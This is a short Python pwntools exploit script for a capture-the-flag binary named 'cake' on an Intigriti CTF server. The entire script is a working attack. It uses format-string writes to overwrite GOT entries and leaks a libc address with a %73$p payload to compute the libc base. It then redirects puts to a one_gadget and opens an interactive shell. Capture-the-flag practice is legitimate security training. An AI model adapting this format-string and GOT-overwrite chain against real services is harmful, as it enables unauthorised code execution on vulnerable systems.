from pwn import *

# p = process('./cake')
# p = remote('localhost', 7777)
p = remote('cake.ctf.intigriti.io', 9999)
e = context.binary = ELF('./cake')
libc = ELF('./libc-2.27.so')

one_gadget = [0x4f3d5, 0x4f432, 0x10a41c]

p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'?\n', fmtstr_payload(20, {e.got['putchar']:e.symbols['main']}))
p.sendlineafter(b'> ', b'3')

p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'?\n', b'!!!!!%73$p')
p.sendlineafter(b'> ', b'3')

p.recvuntil(b'!!!!!')
libc.address = int(p.recvline()[:-1], 16) - (libc.symbols['__libc_start_main']+231)
print(hex(libc.address))

p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'?\n', fmtstr_payload(20, {e.got['puts']:libc.address+one_gadget[2]}))
p.sendlineafter(b'> ', b'3')

p.interactive()

